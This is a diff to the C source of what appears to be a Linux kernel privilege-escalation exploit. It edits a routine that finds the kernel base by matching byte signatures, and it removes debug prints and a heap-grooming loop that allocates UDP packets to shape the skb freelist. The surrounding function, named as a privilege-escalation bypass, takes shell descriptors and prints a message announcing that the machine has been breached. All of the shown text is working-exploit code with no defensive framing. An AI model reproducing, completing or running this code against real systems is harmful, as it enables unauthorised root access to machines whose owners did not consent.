@@ -127,10 +127,8 @@ static int is_kernel_base(unsigned char *addr)
 	
 	// get-sig kernel_runtime_1
 	if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
-			memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0){
-		printf("[*][*][*][*] first worked ====\n");
+			memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
 		return 1;
-		}
 
 	// get-sig kernel_runtime_2
 	if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
@@ -143,10 +141,8 @@ static int is_kernel_base(unsigned char *addr)
 			memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
 			memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
 			memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
-			memcmp(addr + 0x78, "\xff\xe0", 2) == 0){
-		printf("[*][*][*][*] second worked ====\n");
+			memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
 		return 1;
-		}
 
 
 	return 0;
@@ -483,14 +479,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 					status_cnt = read(status_fd, &buf, 1);
 					if (status_cnt == 0)
 						continue;
-
-						// pop N skbs from skb freelist
-					for (int i=0; i < 200; i++)
-					{
-						PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, 200);
-						alloc_ipv4_udp(1);
-					}
-
 
 					printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);
 
